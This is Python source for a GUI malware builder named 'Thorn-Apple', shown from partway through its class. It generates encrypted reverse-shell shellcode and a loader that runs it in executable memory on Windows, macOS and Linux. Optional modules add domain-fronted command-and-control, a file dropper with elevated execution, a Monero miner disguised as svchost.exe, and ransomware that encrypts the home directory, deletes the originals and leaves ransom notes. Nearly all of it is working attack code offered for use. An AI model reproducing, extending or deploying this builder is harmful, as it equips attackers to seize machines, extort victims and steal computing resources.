            if not self.front_domain_input.text() or not self.real_domain_input.text():
                errors.append("Both domains are required for domain fronting")
                
        return errors

    def generate_payload(self):
        # Validate inputs
        errors = self.validate_inputs()
        if errors:
            QMessageBox.critical(self, "Validation Error", "\n".join(errors))
            return
            
        self.progress_bar.setVisible(True)
        self.progress_bar.setRange(0, 100)
        self.progress_bar.setValue(0)
        
        # Save module configurations
        self.mining_config = {
            'pool_url': self.pool_input.text(),
            'wallet': self.wallet_input.text(),
            'password': 'x',
            'cpu_percent': self.cpu_spin.value(),
            'idle_only': self.idle_mining_cb.isChecked(),
            'light_mode': self.light_mode_cb.isChecked()
        }
        
        self.ransom_config = {
            'note': self.note_input.toPlainText(),
            'extensions': [ext.strip() for ext in self.ext_input.text().split(',')],
            'exclusions': [excl.strip().lower() for excl in self.excl_input.text().split(',')]
        }
        
        self.domain_fronting_config = {
            'enabled': self.fronting_cb.isChecked(),
            'front_domain': self.front_domain_input.text(),
            'real_domain': self.real_domain_input.text()
        }

        lhost = self.lhost_input.text()
        lport = self.lport_input.text()
        ip_version = self.ip_version_combo.currentText()
        encoder = self.encoder_combo.currentText()
        arch = self.arch_combo.currentText()
        platform_os = self.platform_combo.currentText()
        format_ = self.format_combo.currentText()
        self.sleep_time = self.sleep_spin.value()
        self.progress_bar.setValue(10)
        
        try:
            shellcode = self.generate_shellcode(lhost, lport, ip_version, arch, platform_os)
            if not shellcode:
                QMessageBox.critical(self, "Error", "Invalid IP address or port")
                self.progress_bar.setVisible(False)
                return
        except binascii.Error as e:
            QMessageBox.critical(self, "Shellcode Error", f"Failed to generate shellcode: {str(e)}")
            self.progress_bar.setVisible(False)
            return
            
        # Read file dropper content if specified
        file_dropper_data = b""
        if self.file_path_input.text():
            try:
                with open(self.file_path_input.text(), "rb") as f:
                    file_dropper_data = f.read()
                self.file_dropper_filename = self.filename_input.text()
            except Exception as e:
                QMessageBox.warning(self, "File Error", f"Could not read file: {str(e)}")
        
        self.progress_bar.setValue(30)
        self.encrypted_shellcode, self.key, self.nonce = self.encrypt_shellcode(shellcode, encoder)
        self.progress_bar.setValue(60)
        self.generated_payload = self.build_final_payload(
            self.encrypted_shellcode,
            self.key,
            self.nonce,
            encoder,
            format_,
            self.get_selected_modules(),
            file_dropper_data,
            self.file_dropper_filename
        )
        self.payload_type = format_
        self.save_btn.setEnabled(True)
        self.progress_bar.setValue(90)
        self.display_results(shellcode, self.encrypted_shellcode, self.key, self.nonce)
        self.progress_bar.setValue(100)
        self.progress_bar.setVisible(False)

    def get_selected_modules(self):
        modules = []
        try:
            if self.registry_cb.isChecked(): modules.append("REGISTRY_PERSIST")
            if self.startup_cb.isChecked(): modules.append("STARTUP_FOLDER")
            if self.scheduled_task_cb.isChecked(): modules.append("SCHEDULED_TASK")
            if self.service_cb.isChecked(): modules.append("SYSTEM_SERVICE")
            if self.file_path_input.text(): modules.append("FILE_DROPPER")
            if self.fronting_cb.isChecked(): modules.append("DOMAIN_FRONTING")
            if self.pool_input.text() and self.wallet_input.text(): modules.append("MINER")
            if self.note_input.toPlainText(): modules.append("RANSOMWARE")
        except RuntimeError:
            # Handle case where C++ object was deleted
            pass
        return modules

    def generate_shellcode(self, lhost, lport, ip_version, arch, platform_os):
        # Validate port
        port = int(lport)
        if not (1 <= port <= 65535):
            return None
            
        # Convert port to hex (big-endian)
        port_hex = f"{port:04x}"
        
        # Convert IP to appropriate format
        if ip_version == "IPv4":
            # Validate IPv4 address
            try:
                socket.inet_pton(socket.AF_INET, lhost)
            except socket.error:
                return None
                
            # Convert IPv4 to hex
            ip_parts = lhost.split('.')
            ip_hex = ''.join([f"{int(part):02x}" for part in ip_parts])
            
            # Select shellcode template
            if arch == "x86":
                template = X86_REVERSE_SHELL
            else:
                template = X64_REVERSE_SHELL
        else:  # IPv6
            # Validate IPv6 address
            try:
                socket.inet_pton(socket.AF_INET6, lhost)
            except socket.error:
                return None
                
            # Convert IPv6 to packed binary then to hex
            ip_bytes = socket.inet_pton(socket.AF_INET6, lhost)
            ip_hex = binascii.hexlify(ip_bytes).decode()
            
            # For IPv6, we only have x64 shellcode for now
            if arch == "x64":
                template = X64_IPV6_REVERSE_SHELL
            else:
                QMessageBox.warning(self, "Unsupported", "IPv6 is only supported for x64 architecture")
                return None
        
        # Replace placeholders
        shellcode_hex = template.replace("{custom_ip}", ip_hex).replace("{custom_port}", port_hex)
        
        # Add junk code for polymorphism
        if self.obfuscate_cb.isChecked():
            junk_length = random.randint(16, 64)
            # Ensure even length
            if junk_length % 2 != 0:
                junk_length += 1
            junk_code = ''.join(random.choice("0123456789abcdef") for _ in range(junk_length))
            shellcode_hex = junk_code + shellcode_hex
        
        # Ensure hex string has even length
        if len(shellcode_hex) % 2 != 0:
            shellcode_hex = "90" + shellcode_hex  # Add NOP to make even length
            
        return binascii.unhexlify(shellcode_hex)

    def encrypt_shellcode(self, shellcode, method):
        # Generate random key and nonce
        if method == "AES-256-GCM":
            key = get_random_bytes(32)  # 256-bit key
            nonce = get_random_bytes(12)  # 96-bit nonce
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            ciphertext, tag = cipher.encrypt_and_digest(shellcode)
            encrypted_data = ciphertext + tag
        else:  # ChaCha20-Poly1305
            key = get_random_bytes(32)  # 256-bit key
            nonce = get_random_bytes(12)  # 96-bit nonce
            cipher = ChaCha20.new(key=key, nonce=nonce)
            ciphertext = cipher.encrypt(shellcode)
            mac = cipher.digest()  # Poly1305 MAC
            encrypted_data = ciphertext + mac
            
        return encrypted_data, key, nonce

    def build_final_payload(self, encrypted_shellcode, key, nonce, method, format_, modules, file_data, file_name):
        if format_ == "Python Loader":
            return self.generate_python_loader(
                encrypted_shellcode, 
                key, 
                nonce, 
                method,
                modules,
                file_data,
                file_name
            )
        elif format_ == "EXE":
            return "PE executable payload ready for saving"
        else:
            return binascii.hexlify(encrypted_shellcode).decode()

    def generate_python_loader(self, encrypted_shellcode, key, nonce, method, modules, file_data, file_name):
        sleep_code = ""
        if self.sleep_time > 0:
            sleep_code = f"    print(f\"[+] Sleeping for {self.sleep_time} seconds...\")\n    time.sleep({self.sleep_time})\n"
        
        # TLS support for loader
        tls_code = ""
        if self.ssl_cb.isChecked():
            tls_code = f"""
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ctx.set_alpn_protocols(['http/1.1'])
ctx.set_ciphers('ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384')
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ssl_sock = ctx.wrap_socket(sock, server_hostname="{HTTPS_SNI}")
ssl_sock.connect(('{self.lhost_input.text()}', {self.lport_input.text()}))
ssl_sock.sendall(b"GET / HTTP/1.1\\r\\nHost: {HTTPS_SNI}\\r\\n\\r\\n")
"""
        
        # Domain Fronting Implementation
        fronting_code = ""
        if "DOMAIN_FRONTING" in modules:
            fronting_code = f"""
    # Domain fronting setup
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('{self.lhost_input.text()}', {self.lport_input.text()}))
    
    # Send fronting request
    request = (
        "CONNECT {self.domain_fronting_config['real_domain']}:443 HTTP/1.1\\r\\n"
        "Host: {self.domain_fronting_config['front_domain']}\\r\\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\\r\\n"
        "Connection: keep-alive\\r\\n\\r\\n"
    )
    sock.sendall(request.encode())
    
    # Read response (expect 200 OK)
    response = sock.recv(4096)
    if b"200 Connection established" not in response:
        raise ConnectionError("Domain fronting failed")
        
    # Wrap socket for SSL
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    ssl_sock = context.wrap_socket(sock, server_hostname="{self.domain_fronting_config['real_domain']}")
            """
        
        # File dropper code
        dropper_code = ""
        if file_data and file_name:
            file_b64 = base64.b64encode(file_data).decode()
            dropper_code = f"""
def drop_and_execute_file():
    import os
    import base64
    import subprocess
    import tempfile
    import ctypes
    import sys
    
    # Get target directory
    if platform.system() == "Windows":
        # Browser downloads folder
        if {self.browser_drop_cb.isChecked()}:
            downloads_path = os.path.join(os.getenv('USERPROFILE'), 'Downloads')
        else:
            downloads_path = os.path.join(tempfile.gettempdir())
    elif platform.system() == "Darwin":  # macOS
        if {self.browser_drop_cb.isChecked()}:
            downloads_path = os.path.join(os.path.expanduser('~'), 'Downloads')
        else:
            downloads_path = '/tmp'
    else:  # Linux
        if {self.browser_drop_cb.isChecked()}:
            downloads_path = os.path.join(os.path.expanduser('~'), 'Downloads')
        else:
            downloads_path = '/tmp'
    
    # Create directory if needed
    os.makedirs(downloads_path, exist_ok=True)
    
    # File path
    file_path = os.path.join(downloads_path, "{file_name}")
    
    # Write file
    try:
        file_content = base64.b64decode("{file_b64}")
        with open(file_path, "wb") as f:
            f.write(file_content)
        print(f"[*] File dropped at: {{file_path}}")
    except Exception as e:
        print(f"[!] File write error: {{str(e)}}")
        return
    
    # Execute file
    try:
        if platform.system() == "Windows":
            # Admin execution with UAC bypass
            if {self.admin_exec_cb.isChecked()}:
                try:
                    # Attempt to run as admin using ShellExecute
                    ctypes.windll.shell32.ShellExecuteW(None, "runas", file_path, None, None, 1)
                    print("[+] File executed with admin privileges")
                except Exception as e:
                    print(f"[!] Admin execution failed: {{str(e)}}")
                    # Fallback to normal execution
                    subprocess.Popen([file_path], shell=True)
            else:
                subprocess.Popen([file_path], shell=True)
        else:
            # On Unix systems, make executable and run
            os.chmod(file_path, 0o755)
            subprocess.Popen([file_path])
        print("[+] File executed successfully")
    except Exception as e:
        print(f"[!] File execution error: {{str(e)}}")
"""
        
        # Monero Miner Implementation
        miner_code = ""
        if "MINER" in modules:
            config_json = json.dumps(self.mining_config)
            miner_code = f"""
def start_miner():
    import os
    import sys
    import subprocess
    import base64
    import json
    import time
    import tempfile
    # Embedded XMRig binary (base64 encoded)
    # This would contain the actual base64-encoded miner binary
    # For demo purposes, we're using a placeholder
    XMRIG_BINARY = base64.b64decode("...")
    # Save miner to temp file
    temp_dir = tempfile.gettempdir()
    miner_path = os.path.join(temp_dir, "svchost.exe" if os.name == 'nt' else ".systemd")
    with open(miner_path, "wb") as f:
        f.write(XMRIG_BINARY)
    if os.name != 'nt':
        os.chmod(miner_path, 0o755)
    # Prepare config
    config = {config_json}
    config_path = os.path.join(temp_dir, "config.json")
    with open(config_path, "w") as f:
        json.dump(config, f)
    # Start miner
    cmd = [
        miner_path,
        "--config", config_path,
        "--cpu-max-threads-hint", str(config['cpu_percent'])
    ]
    if config['light_mode']:
        cmd.append("--background")
    if config['idle_only']:
        cmd.append("--idle")
    subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("[*] Cryptocurrency miner started")
"""
        
        # Ransomware Implementation
        ransomware_code = ""
        if "RANSOMWARE" in modules:
            ransomware_code = f"""
def encrypt_files():
    import os
    import json
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    
    # Generate encryption key
    key = get_random_bytes(32)
    
    # Save key (in real scenario, this would be exfiltrated)
    with open(os.path.join(os.path.expanduser("~"), "decryption_key.txt"), "wb") as f:
        f.write(base64.b64encode(key))
    
    # File traversal
    skipped_folders = {json.dumps(self.ransom_config['exclusions'])}
    target_extensions = {json.dumps(self.ransom_config['extensions'])}
    
    for root, dirs, files in os.walk(os.path.expanduser("~")):
        # Skip system folders
        if any(excl in root.lower() for excl in skipped_folders):
            continue
            
        for file in files:
            file_path = os.path.join(root, file)
            
            # Skip system files and large files
            if not any(file.lower().endswith(ext) for ext in target_extensions):
                continue
            if os.path.getsize(file_path) > 100 * 1024 * 1024:  # 100MB
                continue
                
            try:
                # Encrypt file
                with open(file_path, "rb") as f:
                    data = f.read()
                
                cipher = AES.new(key, AES.MODE_GCM)
                ciphertext, tag = cipher.encrypt_and_digest(data)
                
                # Write encrypted file
                with open(file_path + ".thorn", "wb") as f:
                    f.write(cipher.nonce)
                    f.write(tag)
                    f.write(ciphertext)
                
                # Remove original
                os.remove(file_path)
                
                # Create ransom note
                note_path = os.path.join(root, "RESTORE_FILES.txt")
                with open(note_path, "w") as f:
                    f.write({json.dumps(self.ransom_config['note'])})
                    
            except Exception as e:
                pass
"""
        
        # Build thread starter code
        thread_code = ""
        if "MINER" in modules:
            thread_code += (
                "    # Start miner thread\n"
                "    miner_thread = threading.Thread(target=start_miner)\n"
                "    miner_thread.daemon = True\n"
                "    miner_thread.start()\n"
            )
        if "RANSOMWARE" in modules:
            thread_code += (
                "    # Start ransomware thread\n"
                "    ransom_thread = threading.Thread(target=encrypt_files)\n"
                "    ransom_thread.daemon = True\n"
                "    ransom_thread.start()\n"
            )
        if file_data and file_name:  # If file dropper is enabled
            thread_code += (
                "    # Start file dropper thread\n"
                "    dropper_thread = threading.Thread(target=drop_and_execute_file)\n"
                "    dropper_thread.daemon = True\n"
                "    dropper_thread.start()\n"
            )

        loader_code = f"""import ctypes
import platform
import binascii
import time
import threading
import tempfile
import base64
import json
import socket
import ssl
from Crypto.Cipher import AES, ChaCha20

# --- Configuration ---
ENCRYPTED_SHELLCODE = binascii.unhexlify("{binascii.hexlify(encrypted_shellcode).decode()}")
ENCRYPTION_KEY = binascii.unhexlify("{binascii.hexlify(key).decode()}")
NONCE = binascii.unhexlify("{binascii.hexlify(nonce).decode()}")
METHOD = "{method}"

# Domain fronting code if enabled
{fronting_code if "DOMAIN_FRONTING" in modules else ""}
# File dropper code if enabled
{dropper_code if file_data and file_name else ""}
# Miner code if enabled
{miner_code if "MINER" in modules else ""}
# Ransomware code if enabled
{ransomware_code if "RANSOMWARE" in modules else ""}

def decrypt_shellcode():
    if METHOD == "AES-256-GCM":
        # Split the encrypted shellcode: last 16 bytes are the tag
        ciphertext = ENCRYPTED_SHELLCODE[:-16]
        tag = ENCRYPTED_SHELLCODE[-16:]
        cipher = AES.new(ENCRYPTION_KEY, AES.MODE_GCM, nonce=NONCE)
        try:
            plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        except ValueError as e:
            print(f"[!] Decryption failed: {{str(e)}}")
            return None
        return plaintext
    else:  # ChaCha20-Poly1305
        # Split the encrypted shellcode: last 16 bytes are the MAC
        ciphertext = ENCRYPTED_SHELLCODE[:-16]
        mac = ENCRYPTED_SHELLCODE[-16:]
        cipher = ChaCha20.new(key=ENCRYPTION_KEY, nonce=NONCE)
        plaintext = cipher.decrypt(ciphertext)
        if cipher.digest() != mac:
            raise ValueError("MAC verification failed")
        return plaintext

def execute_shellcode(shellcode):
    os_type = platform.system()
    if os_type == "Windows":
        ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
        ctypes.windll.kernel32.RtlMoveMemory.argtypes = (
            ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t
        )
        ptr = ctypes.windll.kernel32.VirtualAlloc(
            ctypes.c_int(0),
            ctypes.c_int(len(shellcode)),
            ctypes.c_int(0x3000),
            ctypes.c_int(0x40)
        )
        buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
        ctypes.windll.kernel32.RtlMoveMemory(
            ctypes.c_void_p(ptr),
            buf,
            ctypes.c_size_t(len(shellcode))
        )
        ht = ctypes.windll.kernel32.CreateThread(
            ctypes.c_int(0),
            ctypes.c_int(0),
            ctypes.c_void_p(ptr),
            ctypes.c_int(0),
            ctypes.c_int(0),
            ctypes.pointer(ctypes.c_int(0))
        )
        ctypes.windll.kernel32.WaitForSingleObject(
            ctypes.c_int(ht),
            ctypes.c_int(-1))
    elif os_type == "Darwin":
        libc = ctypes.CDLL(None)
        addr = ctypes.c_void_p()
        libc.mach_vm_allocate(
            ctypes.c_int(-1),
            ctypes.byref(addr),
            ctypes.c_size_t(len(shellcode)),
            ctypes.c_int(1))
        ctypes.memmove(addr, shellcode, len(shellcode))
        libc.mach_vm_protect(
            ctypes.c_int(-1),
            addr,
            ctypes.c_size_t(len(shellcode)),
            ctypes.c_int(0),
            ctypes.c_int(7))
        thread = ctypes.c_void_p()
        libc.pthread_create(
            ctypes.byref(thread),
            None,
            ctypes.c_void_p(addr),
            None)
        libc.pthread_join(thread, None)
    else:
        libc = ctypes.CDLL(None)
        ptr = libc.mmap(
            0,
            len(shellcode),
            ctypes.c_int(0x7),
            ctypes.c_int(0x22),
            ctypes.c_int(-1),
            ctypes.c_int(0))
        ctypes.memmove(ptr, shellcode, len(shellcode))
        func = ctypes.CFUNCTYPE(ctypes.c_void_p)(ptr)
        func()

if __name__ == "__main__":
    try:
        print("[-] Thorn-Apple Payload Initializing...")
{sleep_code}
{thread_code}
        shellcode = decrypt_shellcode()
        if shellcode is None:
            print("[!] Decryption failed, exiting.")
            exit(1)
        print("[-] Executing payload...")
        execute_shellcode(shellcode)
        print("[-] Payload execution completed")
    except Exception as e:
        print(f"[!] Error: {{str(e)}}")
"""
        return loader_code

    def display_results(self, orig_shellcode, enc_shellcode, key, nonce):
        # Mask the key for display (first 4 and last 4 characters)
        key_hex = binascii.hexlify(key).decode()
        masked_key = f"{key_hex[:4]}...{key_hex[-4:]}"
        
        # Mask the nonce similarly
        nonce_hex = binascii.hexlify(nonce).decode()
        masked_nonce = f"{nonce_hex[:4]}...{nonce_hex[-4:]}"
        
        result = (
            "=== Thorn-Apple Payload Generation Report ===\n\n"
            "!!! SECURITY WARNING !!!\n"
            "The encryption key below provides full access to your payload.\n"
            "Treat it as highly sensitive material - anyone with this key can decrypt your shellcode.\n\n"
            "Generation Parameters:\n"
            f"LHOST: {self.lhost_input.text()}\n"
            f"LPORT: {self.lport_input.text()}\n"
            f"IP Version: {self.ip_version_combo.currentText()}\n"
            f"Sleep Time: {self.sleep_time} seconds\n"
            f"Encryption: {self.encoder_combo.currentText()}\n"
            f"Architecture: {self.arch_combo.currentText()}\n"
            f"Platform: {self.platform_combo.currentText()}\n"
            f"Format: {self.format_combo.currentText()}\n\n"
            "Security Features:\n"
            "- Military-grade authenticated encryption\n"
            "- Polymorphic code generation\n"
            "- Anti-analysis techniques\n"
            "- Unique shellcode per generation\n"
            "- Randomized sleep evasion\n\n"
            "Payload Details:\n"
            f"Original Size: {len(orig_shellcode)} bytes\n"
            f"Encrypted Size: {len(enc_shellcode)} bytes\n"
            f"Encryption Key: {masked_key} (full key copied to clipboard)\n"
            f"Nonce: {masked_nonce}\n\n"
            "=== Selected Advanced Modules ===\n"
        )
        
        # Add module status
        modules = self.get_selected_modules()
        if modules:
            for module in modules:
                result += f"- {module.replace('_', ' ').title()}\n"
        else:
            result += "No advanced modules selected\n"
        
        # Add file dropper info
        if self.file_path_input.text():
            result += f"\nFile Dropper Details:\n"
            result += f"  - Target Filename: {self.filename_input.text()}\n"
            result += f"  - Admin Rights: {'Yes' if self.admin_exec_cb.isChecked() else 'No'}\n"
            result += f"  - Browser Folder: {'Yes' if self.browser_drop_cb.isChecked() else 'No'}\n"
            
        # Add domain fronting info
        if self.fronting_cb.isChecked():
            result += f"\nDomain Fronting Details:\n"
            result += f"  - Front Domain: {self.front_domain_input.text()}\n"
            result += f"  - Real Domain: {self.real_domain_input.text()}\n"
            
        # Add miner info
        if "MINER" in modules:
            result += f"\nMonero Miner Details:\n"
            result += f"  - Mining Pool: {self.pool_input.text()}\n"
            result += f"  - Wallet: {self.wallet_input.text()[:20]}...{self.wallet_input.text()[-20:]}\n"
            result += f"  - CPU Usage: {self.cpu_spin.value()}%\n"
            result += f"  - Idle Only: {'Yes' if self.idle_mining_cb.isChecked() else 'No'}\n"
            result += f"  - Light Mode: {'Yes' if self.light_mode_cb.isChecked() else 'No'}\n"
            
        # Add ransomware info
        if "RANSOMWARE" in modules:
            result += f"\nRansomware Details:\n"
            result += f"  - Target Extensions: {', '.join(self.ransom_config['extensions'])}\n"
            result += f"  - Excluded Folders: {', '.join(self.ransom_config['exclusions'])}\n"
            
        result += "\n=== Generated Payload ===\n\n"
        
        if self.payload_type == "Python Loader":
            result += self.generated_payload
        else:
            result += binascii.hexlify(self.encrypted_shellcode).decode()[:512] + "..."
        
        self.output_text.setPlainText(result)
        
        # Copy full key to clipboard securely
        clipboard = QGuiApplication.clipboard()
        clipboard.setText(key_hex)
        self.status_label.setText("Full encryption key copied to clipboard - handle with care!")
    
    def save_payload(self):
        "Save payload to file with appropriate extension"
        if not self.generated_payload or not self.encrypted_shellcode:
            return
            
        file_ext = {
            "EXE": "exe",
            "Python Loader": "py",
            "Shellcode": "bin"
        }.get(self.payload_type, "bin")
        
        filename, _ = QFileDialog.getSaveFileName(
            self,
            "Save Payload",
            f"payload_{random.randint(1000,9999)}.{file_ext}",
            f"Payload Files (*.{file_ext})"
        )
        
        if not filename:
            return
            
        try:
            if self.payload_type == "Python Loader":
                with open(filename, "w") as f:
                    f.write(self.generated_payload)
                # Make executable on Unix systems
                if platform.system() != "Windows":
                    os.chmod(filename, 0o755)
                self.output_text.append(f"\n\nPayload saved to: {filename}")
                
            elif self.payload_type == "Shellcode":
                with open(filename, "wb") as f:
                    f.write(self.encrypted_shellcode)
                self.output_text.append(f"\n\nShellcode saved to: {filename}")
                
            else:  # EXE
                self.output_text.append("\n\nEXE generation not implemented in this version")
                
        except Exception as e:
            self.output_text.append(f"\n\nError saving payload: {str(e)}")
    
    def closeEvent(self, event):
        "Clean up when closing the application"
        if self.listener_thread and self.listener_thread.isRunning():
            self.listener_thread.stop()
            self.listener_thread.quit()
            self.listener_thread.wait(2000)
        event.accept()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    # Suppress deprecation warnings
    import warnings
    warnings.filterwarnings("ignore", category=DeprecationWarning)
    
    # Set window icon if available
    icon_path = "thorn_apple.ico"
    if os.path.exists(icon_path):
        app.setWindowIcon(QIcon(icon_path))
    
    window = ReverseShellGenerator()
    window.show()
    sys.exit(app.exec_())